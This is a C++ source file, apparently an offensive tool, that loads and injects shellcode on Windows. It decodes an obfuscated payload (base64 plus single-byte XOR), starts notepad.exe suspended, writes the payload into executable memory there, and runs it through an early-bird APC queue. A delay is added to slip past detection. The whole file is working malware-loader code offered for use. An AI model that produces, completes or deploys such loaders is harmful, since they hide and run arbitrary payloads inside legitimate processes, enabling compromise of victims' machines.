#include <windows.h>
#include <iostream>

// shellcode.h replacement - add these two lines
#define XOR_KEY 0xAA
const char* b64_shellcode = "VuIpTlpCZqqqquv76/r44pt4z+Ih+Mr74iH4suIh+Ir84iHY+uebY+KlHeDg4ptqBpbL1qiGiutrY6frq2tIR/jr++Ih+Ioh6Jbiq3rMK9KyoailL9iqqqohKiKqqqriL2rezeKreu4h6or646t6IeKySfziVWPrIZ4i55tj4qt84ptq62tjpwbrq2uSSt9b5qnmjqLvk3vfcvLuIeqO46t6zOshpuLuIeq246t66yGuIuvy4qt66/L08/Dr8uvz6/DiKUaK6/hVSvLr8/DiIbhD4VVVVffim3H54xTdw8TDxM/equv84iNL421o5t2MrVV/+flC3KqqqufF0MPGxsuFn4SaioLny8nDxN7F2cKRiuPE3s/GiufLyYrl+Yryipua9Zuf9Z2Diuva2sbP/c/I4cPehZ+ZnYSZnIqC4eL+5+aGisbDwc+K7c/JwcWDiunC2MXHz4WbmZuEmoSahJqK+cvMy9jDhZ+ZnYSZnKrz+fDnm2rnm2P5+eMQkPzTDaqqqqpVf0Kkqqqqm5qEm5ychJ2ehJiem6rw4iNr421qEauqquebY/n5wKn54xD9IzVsqqqqqlV/QneqqqqFwPne/+Xdmc+e+8/k9fPQ9Z/uk9PmzePSn5nl78af//762ufb38b83Jjm4dP5n8bB3v/swdD4/sPb+PrZ+MeexOfb7NPZ79j18OPaxpn8ycfv7c3DxcXj7dPh0vzi2vDDz/7b8M7t48nI/5j8n8WT+PWH6/v48+bS3/DEw9zb3pnjwvzdzMj/nZ3l/vyd0Mbu05ic6NnJ5p7imevP6ZLJ+ODT/sz+7MLg0J7S2of+n9Dc0MjgnNjh/unc++Dg78fhyfvF+OjTn8LS++/j5f396cXB8p/J5M/14+XpquIja/nw6/Lnm2P54hKqmAIuqqqqqvr5+eNtaEH/hJFVf+IjbMCg9eIjW8C18PjCKpmqquMjSsCu6/PjEN/sNCyqqqqqVX/nm2r58OIjW+ebY+ebY/n5421oh6yy0VV/L2rfteJtayK5qqrjEO5an0qqqqqqVX/iVWXeqEEAQv+qqqr588Dq8OMje2tIuuNtaqq6qqrjEPIO+U+qqqqqVX/iOfn54iNN4iNb4iNw421qqoqqquMjU+MQuDwjSKqqqqpVf+Ipboovat4YzCGt4qtpL2rfePJp8sCq8+NtaFofCPxVfw==";

DWORD Base64Decode(const char* input, BYTE** output) {
    DWORD len = 0;
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
    *output = (BYTE*)malloc(len);
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &len, NULL, NULL);
    return len;
}

void DecryptShellcode(BYTE* data, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    Sleep(1500);
    BYTE* decoded = NULL;
    DWORD len = Base64Decode(b64_shellcode, &decoded);
    DecryptShellcode(decoded, len, XOR_KEY);
    unsigned char* shellcode = decoded;
    SIZE_T shellcodeSize = len;

    LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
    PROCESS_INFORMATION procInfo;

    printf("[+] Creating Notepad.exe as Suspended Process.\n");
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);
    

    // 4. Allocate memory in the target process
    LPVOID remoteMemory = VirtualAllocEx(procInfo.hProcess,NULL,shellcodeSize,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

    if (!remoteMemory) {
        std::cerr << "Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 5. Write the shellcode to the allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(procInfo.hProcess,remoteMemory,shellcode,shellcodeSize,&bytesWritten)) {
        std::cerr << "Failed to write shellcode to the target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 6. Queue an APC to the main thread of the target process (FIXED: cast NULL to ULONG_PTR)
    if (!QueueUserAPC((PAPCFUNC)remoteMemory, procInfo.hThread, (ULONG_PTR)NULL)) {
        std::cerr << "Failed to queue APC. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 7. Resume the main thread to trigger the APC and execute the shellcode
    if (ResumeThread(procInfo.hThread) == -1) {
        std::cerr << "Failed to resume thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 8. Cleanup
    CloseHandle(procInfo.hThread);
    CloseHandle(procInfo.hProcess);
    delete startupInfo;
    free(decoded);

    return 0;
}
